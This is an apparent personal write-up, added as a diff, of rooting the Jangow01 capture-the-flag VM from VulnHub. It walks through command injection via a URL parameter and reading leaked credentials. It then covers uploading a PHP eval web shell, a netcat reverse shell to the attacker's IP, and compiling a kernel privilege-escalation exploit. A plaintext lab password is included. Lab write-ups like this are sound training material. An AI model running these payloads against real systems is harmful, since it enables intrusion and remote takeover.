@@ -1,0 +1,101 @@
+Jangow-write-up.txt
+
+In this write up I will be walking through the steps taken to obtain root access for the Jangow01 
+CTF on vulnhub
+
+I start with opening my terminal acting as the adversary and running a netdiscover on my local network
+
+netdiscover -r 192.168.0.0/24
+(put netdisover screenshot here)
+In the screenshot provided I was able to locate what I assume is my vicitim box
+I am able to validate this by navigating the my web browser and going to 192.168.0.79
+Since I do see that this is a website, I will go ahead and move forward in my recon and
+nmap this domain by using the following command
+nmap -v -p- 192.168.0.79
+In the following results I see that port 21/80 are both open
+(put nmap screenshot)
+This does not provide me with many details so I go ahead and navigate back to the website
+I was able to discover something that stood out
+http://192.168.0.79/site/busque.php?buscar=
+
+In this URL I was able to input 
+http://192.168.0.79/site/busque.php?buscar=ls
+which ended up coming back with the list of contents in the directory that I am currently in
+I ended up using
+http://192.168.0.79/site/busque.php?buscar=pwd
+(put pwd screenshot here)
+which game me the output of /var/www/html/site 
+http://192.168.0.79/site/busque.php?buscar=ls -all /var/www/html/site
+
+http://192.168.0.79/site/busque.php?buscar=ls -all /var/www/html
+which then gave me .backup
+http://192.168.0.79/site/busque.php?buscar=cat%20/var/www/html/.backup
+(put backup screenshot here)
+ftp 192.168.0.79 - used backup creditnals
+
+I cannot do much other than drop a file onto the server via filezilla since I only have FTP access
+
+At this point I figured I can attempt to upload a shell to the server
+echo "<?php if (isset(\$_POST['cmd'])) { eval(\$_POST['cmd']); } ?>" > shell2.php
+
+Since I did not get an error I double check by using ls in the URL field once again
+I now see that there is my shell2.php on the server
+
+I use a great tool called AntSword to connect to the shell by giving it the following:
+(put shell screenshot here)
+I validate my connection by hitting "Test connection"
+I hit launch terminal inside of AntSword
+
+Great now I have access to a shell but now I really need to obtain a reverse shell on my machine 
+
+I now create a new file called rev.php to create a reverse shell
+<?php
+system("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.0.215 443 > /tmp/f");
+?>
+(put rev screenshot here)
+
+After navigating to http://192.168.0.79/site/rev.php on my adversary machine I then went to
+
+nc -lvnp 443 in the terminal to catch the signal
+
+I now have access to the shell on my adversary machine
+to make it an interactive shell I then confirmed what python the system was using by using these
+commands
+which python -nothing in return
+which python3 - /usr/bin/python3
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+shell is now interactive
+su - jangow01
+password: abygurl69
+
+cat /etc/*release - this was able to locate the OS version & ID 
+(put os screenshot here)
+Now that I have the OS version and ID I am able to search what exploit I can use to get root access
+
+searchsploit Ubuntu 16.04
+(put searchsploit screenshot here)
+I did some quick research and the Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora  | linux/local/45010.c
+is a local privilege escalation method so I go ahead and pick that one
+searchsploit -m linux/local/45010.c
+
+I want to find out how to use the file so I go ahead and run the following command
+head -100 45010.c
+
+find out that I will need to gcc the file
+
+I take the file from my adversary box and upload it to my vicitim box via filezilla
+
+gcc 45010.c -o exploit > changed the -o (output) name to exploit
+chmod +x exploit
+./exploit
+(put exploit screenshot here)
+GOT ROOT ACCESS
+
+rerun this code to get interactive again: python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+cd /ROOT
+cat proof.txt 
+(put root screenshot here)
+GAME OVER
